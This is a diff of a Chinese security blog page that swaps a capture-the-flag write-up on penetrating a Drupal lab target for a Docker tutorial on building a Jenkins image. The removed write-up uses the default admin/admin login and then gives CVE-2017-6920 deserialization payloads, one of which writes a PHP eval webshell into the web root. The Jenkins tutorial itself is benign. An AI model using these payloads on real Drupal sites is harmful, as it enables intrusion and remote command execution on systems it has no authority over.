@@ -4,33 +4,27 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>企业赛真题-drupal渗透-Writeup | GetFlag&#39;s Blog</title>
+    <title>Docker搭建Jenkins | GetFlag&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="GetFlag">
     
 
     
-    <meta name="description" content="西普杯铁人三项赛，训练营企业赛真题drupal渗透。铁三全是CVE的洞，真给劲。测试了大半下午，实验环境的菜刀是废的，不妨碍验证是否成功拿下webshell">
-<meta name="keywords" content="Writeup,综合渗透,铁人三项">
+    <meta name="description" content="《第一本Docker书》第五章实例">
+<meta name="keywords" content="Docker,Jenkins">
 <meta property="og:type" content="article">
-<meta property="og:title" content="企业赛真题-drupal渗透-Writeup">
-<meta property="og:url" content="http://flag0.com/2018/03/22/铁三真题-drupal-Writeup/index.html">
+<meta property="og:title" content="Docker搭建Jenkins">
+<meta property="og:url" content="http://flag0.com/2019/09/04/Docker搭建Jenkins/index.html">
 <meta property="og:site_name" content="GetFlag&#39;s Blog">
-<meta property="og:description" content="西普杯铁人三项赛，训练营企业赛真题drupal渗透。铁三全是CVE的洞，真给劲。测试了大半下午，实验环境的菜刀是废的，不妨碍验证是否成功拿下webshell">
+<meta property="og:description" content="《第一本Docker书》第五章实例">
 <meta property="og:locale" content="cn-zh">
-<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/001.png">
-<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/002.png">
-<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/003.png">
-<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/004.png">
-<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/005.png">
-<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/006.png">
-<meta property="og:image" content="http://flag0.com/img/images/铁三真题drupal/007.png">
-<meta property="og:updated_time" content="2018-03-22T10:49:30.674Z">
+<meta property="og:image" content="http://flag0.com/img/images/Docker搭建Jenkins/1567607302762.png">
+<meta property="og:updated_time" content="2019-09-04T14:35:31.548Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="企业赛真题-drupal渗透-Writeup">
-<meta name="twitter:description" content="西普杯铁人三项赛，训练营企业赛真题drupal渗透。铁三全是CVE的洞，真给劲。测试了大半下午，实验环境的菜刀是废的，不妨碍验证是否成功拿下webshell">
-<meta name="twitter:image" content="http://flag0.com/img/images/铁三真题drupal/001.png">
+<meta name="twitter:title" content="Docker搭建Jenkins">
+<meta name="twitter:description" content="《第一本Docker书》第五章实例">
+<meta name="twitter:image" content="http://flag0.com/img/images/Docker搭建Jenkins/1567607302762.png">
 
     
     <link rel="alternative" href="/atom.xml" title="GetFlag&#39;s Blog" type="application/atom+xml">
@@ -86,14 +80,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/03/22/铁三真题-drupal-Writeup/" title="企业赛真题-drupal渗透-Writeup" itemprop="url">企业赛真题-drupal渗透-Writeup</a>
+      <a href="/2019/09/04/Docker搭建Jenkins/" title="Docker搭建Jenkins" itemprop="url">Docker搭建Jenkins</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-03-22T08:00:00.000Z" itemprop="datePublished"> 发表于 2018-03-22</time>
+    <time datetime="2019-09-04T14:35:31.000Z" itemprop="datePublished"> 发表于 2019-09-04</time>
     
   </p>
 </header>
@@ -102,55 +96,45 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-任务目标"><span class="toc-number">1.</span> <span class="toc-text">0x01:任务目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-题目分析"><span class="toc-number">2.</span> <span class="toc-text">0x02:题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-致谢"><span class="toc-number">3.</span> <span class="toc-text">0x03:致谢</span></a></li></ol>
+			
 		
 		</div>
 		
-		<p>西普杯铁人三项赛，训练营企业赛真题drupal渗透。<br>铁三全是CVE的洞，真给劲。<br>测试了大半下午，实验环境的菜刀是废的，不妨碍验证是否成功拿下webshell<br><a id="more"></a></p>
-<h2 id="0x01-任务目标"><a href="#0x01-任务目标" class="headerlink" title="0x01:任务目标"></a>0x01:任务目标</h2><p><img src="\img\images\铁三真题drupal\001.png" alt="images"><br>可以看到只是让我们拿webshell，没有涉及提权和内网渗透</p>
-<h2 id="0x02-题目分析"><a href="#0x02-题目分析" class="headerlink" title="0x02:题目分析"></a>0x02:题目分析</h2><p>从题目中就可以看出，这次的靶机web用的drupal搭建，搜一下在网上drupal爆出的漏洞</p>
-<p>可以发现drupal爆出了两个漏洞</p>
+		<p>《第一本Docker书》第五章实例</p>
+<a id="more"></a>
+<p><strong>创建Jenkins目录</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir jenkins</span><br></pre></td></tr></table></figure>
+<p><strong>在<code>jenkins</code>目录下，创建Dockerfile文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:14.04</span><br><span class="line">MAINTAINER root@flag0.com</span><br><span class="line">ENV REFRESHED_AT 2019-9-4</span><br><span class="line"></span><br><span class="line">RUN apt-get update -qq &amp;&amp; apt-get install -yqq curl apt-transport-https</span><br><span class="line">RUN apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</span><br><span class="line"></span><br><span class="line">RUN echo deb https://apt.dockerproject.org/repo ubuntu-trusty main &gt; /etc/apt/sources.list.d/docker.list</span><br><span class="line">RUN apt-get update -qq &amp;&amp; apt-get install -yqq iptables ca-certificates openjdk-7-jdk git-core docker-engine</span><br><span class="line"></span><br><span class="line">ENV JENKINS_HOME /opt/jenkins/data</span><br><span class="line">ENV JENKINS_MIRROR http://mirrors.jenkins-ci.org</span><br><span class="line"></span><br><span class="line">#RUN mkdir -p $JENKINS_HOME/plugins</span><br><span class="line"></span><br><span class="line">RUN curl -f -o /opt/jenkins/jenkins.war -L $JENKINS_MIRROR/war-stable/1.554.3/jenkins.war</span><br><span class="line">COPY ./jenkins.war /opt/jenkins/jenkins.war</span><br><span class="line">RUN for plugin in chunknorris greenballs scm-api git-client git ws-cleanup;do curl -sf -o $JENKINS_HOME/plugins/$&#123;plugin&#125;.hpi -L $JENKINS_MIRROR/plugins/$&#123;plugin&#125;/latest/$&#123;plugin&#125;.hpi;done</span><br><span class="line">ADD ./dockerjenkins.sh /usr/local/bin/dockerjenkins.sh</span><br><span class="line">RUN chmod +x /usr/local/bin/dockerjenkins.sh</span><br><span class="line"></span><br><span class="line">VOLUME /var/lib/docker</span><br><span class="line"></span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line">ENTRYPOINT [&quot;/usr/local/bin/dockerjenkins.sh&quot;]</span><br></pre></td></tr></table></figure>
+<p>ps:这里如果jenkins.war下载过慢可以用迅雷下载后上传到jenkins目录下使用<code>RUN mkdir -p $JENKINS_HOME/plugins</code>复制过去</p>
+<p><strong>获取dockerjenkins.sh</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/turnbullpress/dockerbook-code/blob/master/code/5/jenkins/dockerjenkins.sh</span><br></pre></td></tr></table></figure>
+<p><strong>构建Docker-Jenkins镜像</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t flag0/dockerjenkins .</span><br></pre></td></tr></table></figure>
+<p><strong>运行Jenkins容器</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 8080:8080 --name jenkins --privileged -d flag0/dockerjenkins</span><br></pre></td></tr></table></figure>
 <ul>
-<li>Drupal SQL注入漏洞(CVE-2014-3704)[7.31-7.x]</li>
-<li>Drupal 远程代码执行漏洞分析(CVE-2017-6920)[8.x]</li>
+<li>–privileged 启动Docker的特权模式，运行我们以其宿主机具有的(几乎)所有能力来运行容器</li>
 </ul>
-<p>这里思路就是看影响版本，更符合哪个，但是我们在这个cms里面看不到任何的版本信息，这种情况下只能逐个尝试，另外由于是综合渗透环境，除了纯web这块，也可以尝试下去用别的思路渗透进去</p>
-<p>首先打开网站<br>发现右上角有Login连接，点击登录<br><img src="\img\images\铁三真题drupal\002.png" alt="images"><br>尝试账号admin密码admin登陆成功<br><img src="\img\images\铁三真题drupal\003.png" alt="images"><br>按照CVE-2017-6920的思路访问</p>
-<pre><code>http://192.168.1.3/admin/config/development/configuration/single/import
-</code></pre><p>打开如下页面，并设置Configuration type为Simple configuration<br>任意输入Configuration name内容，在Paste your Configuration here框中输入如下payload</p>
-<pre><code>!php/object &quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:{s:33:\&quot;\0GuzzleHttp\\Psr7\\
-FnStream\0methods\&quot;;a:1:{s:5:\&quot;close\&quot;;s:7:\&quot;phpinfo\&quot;;}s:9:\&quot;_fn_close\&quot;;s:7:\
-&quot;phpinfo\&quot;;}&quot;
-</code></pre><p><img src="\img\images\铁三真题drupal\004.png" alt="images"><br>点击import提交<br>效果如下<br><img src="\img\images\铁三真题drupal\005.png" alt="images"><br>在phpinfo页面搜索DOCUMNET_ROOT找到web根目录<br><img src="\img\images\铁三真题drupal\006.png" alt="images"></p>
-<pre><code>/var/www/html/drupal8/
-</code></pre><p>构造如下payload，写入webshell</p>
-<pre><code>!php/object &quot;0:31&quot;:\&quot;GuzzleHttp\\Cookie\\FileCookieJar\&quot;:4:{s:41:\&quot;\0GuzzleHttp\\
-Cookie\\FileCookieJar\0filename\&quot;;s:31\&quot;/var/www/html/drupal8/shell.php\&quot;;s:52:\&quot;\
-0GuzzleHttp\\Cookie\\FileCookieJar\0storeSessionCookies\&quot;;b:0;s:36:\
-&quot;\0GuzzHttp\\Cookie\CookieJar\0cookies\&quot;;a:1:{i:0;0:27:\&quot;GuzzleHttp\\Cookie\\
-SetCookie\&quot;:1:{s:33:\&quot;\0GuzzleHttp\\Cookie\SetCookie\0data\&quot;;a:10:{s:4:\&quot;Name\
-&quot;;s:4:\&quot;123a\&quot;;s:5:\&quot;Value\&quot;;s:1:\&quot;0\&quot;;s:6:\&quot;Domain\&quot;;s:1:\&quot;a\&quot;;s:4:\&quot;Path\&quot;;s
-:1:\&quot;a\&quot;;s:7:\&quot;Max-Age\&quot;;N;s:7:\&quot;Expires\&quot;;i:123456;s:6:\&quot;Secure\&quot;;b:0;s:7:\&quot;
-Discard\&quot;;b:0;s:8:\&quot;HttpOnly\&quot;;b:0;s:1:\&quot;a\&quot;;s:25:\&quot;&lt;?php eval($_POST[cmd])?&gt;\&quot;;}}}
-s:39:\&quot;\0GuzzleHttp\Cookie\\CookieJar\0strictMode\&quot;;N;}&quot;&quot;
-</code></pre><p>点击import即可看到web根目录下写入了shell.php木马文件密码cmd<br>用菜刀连接即可</p>
-<p><img src="\img\images\铁三真题drupal\007.png" alt="images"></p>
-<p>ps:<br>payload在实验工具文件夹下</p>
-<h2 id="0x03-致谢"><a href="#0x03-致谢" class="headerlink" title="0x03:致谢"></a>0x03:致谢</h2><pre><code>https://paper.seebug.org/334/
-</code></pre>  
+<p><strong>检查Jenkins容器的日志</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@iz0201z3qoku45z jenkins]# docker logs jenkins</span><br><span class="line">/proc/self/fd /</span><br><span class="line">/</span><br><span class="line">Command &quot;daemon&quot; is deprecated, and will be removed in Docker 17.12. Please run `dockerd` directly.</span><br><span class="line">time=&quot;2019-09-04T13:29:04.960039734Z&quot; level=info msg=&quot;libcontainerd: new containerd process, pid: 35&quot; </span><br><span class="line">Running from: /opt/jenkins/jenkins.war</span><br><span class="line">webroot: EnvVars.masterEnvVars.get(&quot;JENKINS_HOME&quot;)</span><br><span class="line">Sep 04, 2019 1:29:05 PM winstone.Logger logInternal</span><br><span class="line">INFO: Beginning extraction from war file</span><br><span class="line">time=&quot;2019-09-04T13:29:06.234769049Z&quot; level=info msg=&quot;Graph migration to content-addressability took 0.00 seconds&quot; </span><br><span class="line">time=&quot;2019-09-04T13:29:06.235733801Z&quot; level=info msg=&quot;Loading containers: start.&quot; </span><br><span class="line">time=&quot;2019-09-04T13:29:06.248746918Z&quot; level=warning msg=&quot;Running modprobe bridge br_netfilter failed with message: modprobe: ERROR: ../libkmod/libkmod.c:556 kmod_search_moddep() could not open moddep file &apos;/lib/modules/3.10.0-957.27.2.el7.x86_64/modules.dep.bin&apos;\nmodprobe: ERROR: ../libkmod/libkmod.c:556 kmod_search_moddep() could not open moddep file &apos;/lib/modules/3.10.0-957.27.2.el7.x86_64/modules.dep.bin&apos;\n, error: exit status 1&quot; </span><br><span class="line">time=&quot;2019-09-04T13:29:06.261703467Z&quot; level=warning msg=&quot;Running modprobe nf_nat failed with message: `modprobe: ERROR: ../libkmod/libkmod.c:556 kmod_search_moddep() could not open moddep file &apos;/lib/modules/3.10.0-957.27.2.el7.x86_64/modules.dep.bin&apos;`, error: exit status 1&quot; </span><br><span class="line">time=&quot;2019-09-04T13:29:06.271570714Z&quot; level=warning msg=&quot;Running modprobe xt_conntrack failed with message: `modprobe: ERROR: ../libkmod/libkmod.c:556 kmod_search_moddep() could not open moddep file &apos;/lib/modules/3.10.0-957.27.2.el7.x86_64/modules.dep.bin&apos;`, error: exit status 1&quot; </span><br><span class="line">time=&quot;2019-09-04T13:29:06.776781793Z&quot; level=info msg=&quot;Default bridge (docker0) is assigned with an IP address 172.18.0.0/16. Daemon option --bip can be used to set a preferred IP address&quot; </span><br><span class="line">time=&quot;2019-09-04T13:29:07.030761342Z&quot; level=info msg=&quot;Loading containers: done.&quot; </span><br><span class="line">time=&quot;2019-09-04T13:29:07.092854607Z&quot; level=info msg=&quot;Daemon has completed initialization&quot; </span><br><span class="line">time=&quot;2019-09-04T13:29:07.092911942Z&quot; level=info msg=&quot;Docker daemon&quot; commit=89658be graphdriver=overlay version=17.05.0-ce </span><br><span class="line">time=&quot;2019-09-04T13:29:07.123869331Z&quot; level=info msg=&quot;API listen on /var/run/docker.sock&quot; </span><br><span class="line">Sep 04, 2019 1:29:07 PM org.eclipse.jetty.util.log.JavaUtilLog info</span><br><span class="line">INFO: jetty-8.y.z-SNAPSHOT</span><br><span class="line">Sep 04, 2019 1:29:10 PM org.eclipse.jetty.util.log.JavaUtilLog info</span><br><span class="line">INFO: NO JSP Support for , did not find org.apache.jasper.servlet.JspServlet</span><br><span class="line">Jenkins home directory: /opt/jenkins/data found at: EnvVars.masterEnvVars.get(&quot;JENKINS_HOME&quot;)</span><br><span class="line">Sep 04, 2019 1:29:11 PM org.eclipse.jetty.util.log.JavaUtilLog info</span><br><span class="line">INFO: Started SelectChannelConnector@0.0.0.0:8080</span><br><span class="line">Sep 04, 2019 1:29:11 PM winstone.Logger logInternal</span><br><span class="line">INFO: Winstone Servlet Engine v2.0 running: controlPort=disabled</span><br><span class="line">Sep 04, 2019 1:29:11 PM jenkins.InitReactorRunner$1 onAttained</span><br><span class="line">INFO: Started initialization</span><br></pre></td></tr></table></figure>
+<p>访问8080端口，成功访问</p>
+<p><img src="\img\images\Docker搭建Jenkins\1567607302762.png" alt="1567607302762"></p>
+<p>因为搭建ctf 环境用不到Jenkins，所以后续没有深入了解</p>
+  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
+  <a class="article-category-link" href="/categories/编程开发/">编程开发</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/Writeup/">Writeup</a><a href="/tags/综合渗透/">综合渗透</a><a href="/tags/铁人三项/">铁人三项</a>
+  <span></span> <a href="/tags/Docker/">Docker</a><a href="/tags/Jenkins/">Jenkins</a>
   </div>
 
 </div>
@@ -159,7 +143,7 @@ s:39:\&quot;\0GuzzleHttp\Cookie\\CookieJar\0strictMode\&quot;;N;}&quot;&quot;
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://flag0.com/2018/03/22/铁三真题-drupal-Writeup/" data-title="企业赛真题-drupal渗透-Writeup | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
+	  <div data-url="http://flag0.com/2019/09/04/Docker搭建Jenkins/" data-title="Docker搭建Jenkins | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -172,19 +156,11 @@ s:39:\&quot;\0GuzzleHttp\Cookie\\CookieJar\0strictMode\&quot;;N;}&quot;&quot;
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2018/03/26/python自动化测试会长测评/" title="python+selenium实现自动化会长测评">
-  <strong>上一篇：</strong><br/>
-  <span>
-  python+selenium实现自动化会长测评</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2018/03/19/综合渗透/"  title="综合渗透笔记 (持续更新)">
+<a href="/2019/09/03/使用Dcoker构建sinatra/"  title="使用Dcoker构建Web应用程序sinatra">
  <strong>下一篇：</strong><br/> 
- <span>综合渗透笔记 (持续更新)
+ <span>使用Dcoker构建Web应用程序sinatra
 </span>
 </a>
 </div>
@@ -201,7 +177,7 @@ s:39:\&quot;\0GuzzleHttp\Cookie\\CookieJar\0strictMode\&quot;;N;}&quot;&quot;
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-任务目标"><span class="toc-number">1.</span> <span class="toc-text">0x01:任务目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-题目分析"><span class="toc-number">2.</span> <span class="toc-text">0x02:题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-致谢"><span class="toc-number">3.</span> <span class="toc-text">0x03:致谢</span></a></li></ol>
+ 
  
   </div>
 
